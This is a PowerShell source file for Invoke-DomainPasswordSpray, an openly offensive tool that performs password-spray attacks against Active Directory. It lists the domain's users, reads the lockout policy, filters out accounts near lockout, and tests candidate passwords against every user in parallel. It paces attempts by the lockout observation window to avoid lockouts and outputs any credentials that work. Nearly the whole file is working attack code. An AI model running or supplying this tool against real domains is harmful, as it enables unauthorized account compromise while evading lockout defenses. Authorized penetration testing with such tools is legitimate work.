function Invoke-DomainPasswordSpray {

    <#
    .SYNOPSIS
		This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain.
    .DESCRIPTION
		This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain.
		If the user provides a list of usernames at runtime, they will be compared against an auto-generated username "safelist" from the domain to ensure none of the provided accounts
		will generate lockout errors.
		Author: Beau Bullock (@dafthack),  Brian Fehrman (@fullmetalcache), and Michael Davis (@mdavis332)
		License: MIT
    .PARAMETER UserName
		Optional UserName parameter. Accepts a string, array of strings, or any number of ADUser Objects.
		A list of domain usernames will be generated automatically if not specified by querying the domain controller.
    .PARAMETER Password
		Password to attempt to use against each user. Can be a single string or array of strings.
    .PARAMETER DomainName
		The domain to spray against.
	.PARAMETER ShowProgress
		Optional switch that, when provided at runtime, displays a progress bar for user spraying status along with immediate console output of any successfully sprayed users
    
    .EXAMPLE
		C:\PS> Invoke-DomainPasswordSpray -Password Winter2016
		Description
		-----------
		This command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.
    
	.EXAMPLE
		C:\PS> Invoke-DomainPasswordSpray -UserName (Get-Content 'c:\users.txt') -DomainName domain.local -PasswordList (Get-Content 'c:\passlist.txt') | Out-File 'sprayed-creds.txt'
		Description
		-----------
		This command will use the userlist at users.txt and try to authenticate to the domain "domain.local" using each password in the passlist.txt file one at a time. 
		It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.
    #>
	
	[CmdletBinding()]
	[System.Diagnostics.CodeAnalysis.SuppressMessage('PSAvoidUsingPlainTextForPassword', '')]
	param(
		[Parameter(	
			Position = 0, 
			Mandatory = $true,
			HelpMessage = 'Password to use. This can be a single string or an array of strings.'
		)]
		[Alias('PasswordList')]
		[string[]]$Password,
		
		[Parameter(	
			Position = 1, 
			Mandatory = $false,
			ParameterSetName = 'String',
			ValueFromPipelineByPropertyName=$true,
			HelpMessage = 'UserName against which to spray passwords. Can be a single string or array of strings.'
		)]
		[Alias('UserList', 'SamAccountName')]
		[string[]]$UserName,
		
		[Parameter(	
			Position = 2, 
			Mandatory = $false,
			HelpMessage = 'Fuly qualified domain name,e.g.: testlab.local. If nothing specified, script automatically attempts to pull FQDN from environment.'
		)]
		[Alias('Domain')]
		[string]$DomainName,
		
		[Parameter(
			Position = 3,
			Mandatory = $false,
			HelpMessage = "Optional switch that allows you to specify whether to show progress bar or not. Default is silent run because it's faster."
		)]
		[switch]$ShowProgress
	)

	$StartTime = Get-Date
	
	$DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	if ($DomainName -eq $null -or $DomainName -eq '') {
		$DomainName = $DomainObject.Name
	}
	
	try {
		# Using domain specified with -DomainName option
		# $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$DomainName").distinguishedName
		$CurrentPdc = "$($DomainObject.PdcRoleOwner.Name)"
		
	} catch {
		Write-Error '[*] Could not connect to the domain. Try again specifying the domain name with the -DomainName option'
		break
	}
	
	$DomainPasswordPolicy = Get-DomainPasswordPolicy -DomainName $DomainName -CheckPso

	$ObservationWindow = $DomainPasswordPolicy.'Lockout Observation Interval (Minutes)'
	$LockoutThreshold = $DomainPasswordPolicy.'Account Lockout Threshold (Invalid logon attempts)' # don't scan more than this many times within the LockoutObservationWindow.Minutes
	
	
	# if there's no lockout threshold (ie, lockoutThreshold = 0, don't bother removing potential lockouts)
	Write-Verbose '[*] Attempting to generate the list of users in the domain...'
	if ($LockoutThreshold -eq 0) {
		$AutoGeneratedUserList = Get-DomainUserList -RemoveDisabled -SmallestLockoutThreshold $LockoutThreshold -DomainName $DomainName
	} else {
		$AutoGeneratedUserList = Get-DomainUserList -RemoveDisabled -RemovePotentialLockouts -SmallestLockoutThreshold $LockoutThreshold -DomainName $DomainName
		Write-Verbose "[*] The smallest lockout threshold discovered in the domain is $LockoutThreshold login attempts."
	}
	
	if ($UserName -ne $null) {
		# if the user has specified a custom user list, compare it to the autogenerated one and remove any usernames from the user-specified list if those are not in the
		# autogenerated list. We do this because the autogenerated list has already filtered locked out, disabled, and potential lockout accounts. We don't want script
		# users accidentally locking out accounts
		Write-Verbose '[*] Comparing provided user list against auto-generated domain user list which is safe to spray'
		[System.Collections.ArrayList]$CompareList = @()
		$CompareList.AddRange($UserName) > $null
		$RemovedUserCount = 0
		for ($i = $CompareList.Count-1; $i -ge 0; $i--) {
			if ($CompareList[$i] -notin $AutoGeneratedUserList) {
				$CompareList.RemoveAt($i)
				$RemovedUserCount++
			}
		}
		Write-Verbose "[*] Removed $RemovedUserCount users because they:"
		Write-Verbose "[*] (1) don't exist on the domain"
		Write-Verbose "[*] (2) are disabled"
		Write-Verbose "[*] (3) are expired"
		Write-Verbose "[*] (4) are locked out or"
		Write-Verbose "[*] (5) are within 1 bad password attempt from lockout"
		$UserName = $CompareList
	} else {
		$UserName = $AutoGeneratedUserList
	}
	
	if ($UserName -eq $null -or $UserName.count -lt 1) {
		Write-Error '[*] No users available to spray. Exiting'
		break
	}
	if ($LockoutThreshold -eq 0) {
		Write-Verbose '[*] There appears to be no lockout policy. Go nuts'
	}

	Write-Verbose "[*] The domain password policy observation window is set to $ObservationWindow minutes"
	Write-Verbose "[*] Password spraying has begun against $($UserName.count) users on the $DomainName domain. Current time is $($StartTime.ToShortTimeString())"
	
	Add-Type -AssemblyName System.DirectoryServices.AccountManagement
	$CurrentPasswordIndex = 0
	
	foreach ($PasswordItem in $Password) {
		
		$PasswordStartTime = Get-Date
		
		Write-Verbose "[*] Beginning trying password $($CurrentPasswordIndex+1) of $($Password.count): $PasswordItem"	
		
		if ($ShowProgress) {
			$InvokeParallelParams = @{ Quiet = $false }
		} else {
			$InvokeParallelParams = @{ Quiet = $true }
		}
		
		$UserName | Invoke-Parallel -ImportVariables -Throttle 20 -Verbose:$false @InvokeParallelParams -ScriptBlock {
			
			
			#$TestDomain = New-Object System.DirectoryServices.DirectoryEntry($Using:CurrentPdc, $_, $Using:PasswordItem)
			$PdcContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext 'Domain', $Using:CurrentPdc
			$AuthResult = $PdcContext.ValidateCredentials($_, $Using:PasswordItem, [DirectoryServices.AccountManagement.ContextOptions]::Negotiate -bor [DirectoryServices.AccountManagement.ContextOptions]::Sealing)
			
			if ($AuthResult) {
				
				if ($ShowProgress) {
					Write-Host -ForegroundColor Green "[*] SUCCESS! User $_ has the password $PasswordItem"
				}
				
				$CredDetails = New-Object PSObject
				$CredDetails | Add-Member -MemberType NoteProperty -Name "UserName" -Value $_
				$CredDetails | Add-Member -MemberType NoteProperty -Name "Password" -Value $Using:PasswordItem
				$CredDetails | Add-Member -MemberType NoteProperty -Name "DomainName" -Value $Using:DomainName
				
				$CredDetails
				
			}

		}
		
		$PasswordEndTime = Get-Date
		$PasswordElapsedTime = New-Timespan –Start $PasswordStartTime –End $PasswordEndTime
		Write-Verbose "[*] Finished trying password $($CurrentPasswordIndex+1) of $($Password.count): $PasswordItem at $($PasswordEndTime.ToShortTimeString())"
		Write-Verbose $("[*] Total time elapsed trying $PasswordItem was {0:hh} hours, {0:mm} minutes, and {0:ss} seconds" -f $PasswordElapsedTime)

		$CurrentPasswordIndex++
		if ($LockoutThreshold -gt 0 -and ( $($Password.count) - $CurrentPasswordIndex ) -gt 0) {
			Invoke-Countdown -Seconds (60 * $ObservationWindow) -Message "Spraying users on domain $DomainName" -Subtext "[*] $CurrentPasswordIndex of $($Password.count) passwords complete. Pausing to avoid account lockout"
		}
		
	}
	
	
	$EndTime = Get-Date
	$ElapsedTime = New-Timespan –Start $StartTime –End $EndTime
	Write-Verbose "[*] Password spraying is complete at $($EndTime.ToShortTimeString())"
	Write-Verbose $("[*] Overall runtime was {0:hh} hours, {0:mm} minutes, and {0:ss} seconds" -f $ElapsedTime)
	
}
